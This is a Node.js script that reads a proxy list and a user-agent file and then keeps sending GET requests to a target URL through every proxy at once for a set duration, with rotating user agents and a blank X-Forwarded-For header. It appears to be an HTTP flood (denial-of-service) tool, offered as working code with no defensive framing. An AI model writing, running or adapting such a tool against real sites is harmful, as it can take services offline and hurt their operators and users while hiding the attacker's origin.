const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const { URL } = require('url');
const { promisify } = require('util');
const readFile = promisify(fs.readFile);

const config = {
    times: 1,
    target: 'http://google.com',
    proxyFile: './proxy_list.txt',
    userAgentFile: './user_agent.json',
    maxRetries: 1,
    concurrentRequests: 6,
    duration: 30000, // Duration in milliseconds (30 seconds)
};

let proxyList = [];
let userAgents = {
    desktop: [],
    mobile: []
};

async function loadConfig() {
    try {
        const proxyData = await readFile(config.proxyFile, 'utf8');
        proxyList = proxyData.split('\n').map(line => {
            let [host, port] = line.split(" ");
            return { host, port: parseInt(port) };
        });

        const userAgentData = await readFile(config.userAgentFile, 'utf8');
        userAgents = JSON.parse(userAgentData);
    } catch (err) {
        console.error('Error loading configuration:', err);
        process.exit(1);
    }
}

function getRandomUserAgent() {
    const allUserAgents = [...userAgents.desktop, ...userAgents.mobile];
    return allUserAgents[Math.floor(Math.random() * allUserAgents.length)];
}

function makeRequest(proxy, targetUrl, duration, retries = 0) {
    return new Promise((resolve, reject) => {
        const startTime = Date.now();
        const endTime = startTime + duration;

        function requestLoop() {
            const userAgent = getRandomUserAgent();
            const url = new URL(targetUrl);
            const options = {
                host: proxy.host,
                port: proxy.port,
                path: url.href,
                headers: {
                    'method': 'GET',
                    'connection': 'Keep-alive',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'user-agent': userAgent,
                    'is-secure-connection': 'True',
                    'x-forwarded-for': '',
                },
            };

            const protocol = url.protocol === 'https:' ? https : http;
            const req = protocol.get(options, (response) => {
                response.on('data', () => { /* Handle data if needed */ });
                response.on('end', () => {
                    if (Date.now() < endTime) {
                        requestLoop();
                    } else {
                        console.log(`Connection succeeded! Proxy: ${proxy.host}:${proxy.port}`);
                        resolve();
                    }
                });
                response.on('error', (e) => {
                    console.log(`Response error: ${e.message}`);
                    if (retries < config.maxRetries) {
                        makeRequest(proxy, targetUrl, duration, retries + 1).then(resolve).catch(reject);
                    } else {
                        reject(e);
                    }
                });
            });

            req.on('error', (e) => {
                console.log(`Request error: ${e.message}`);
                if (retries < config.maxRetries) {
                    makeRequest(proxy, targetUrl, duration, retries + 1).then(resolve).catch(reject);
                } else {
                    reject(e);
                }
            });
        }

        requestLoop();
    });
}

async function connect(times) {
    const total = proxyList.length;
    let success = 0;

    for (let z = 0; z < times; z++) {
        const promises = proxyList.map(proxy => makeRequest(proxy, config.target, config.duration));
        await Promise.all(promises).then(() => {
            success += promises.length;
            console.log(`Iteration ${z + 1} completed. Success: ${success}/${total * (z + 1)}`);
        }).catch(err => {
            console.error('Error during requests:', err);
        });
    }
}

(async () => {
    await loadConfig();
    await connect(config.times);
})();
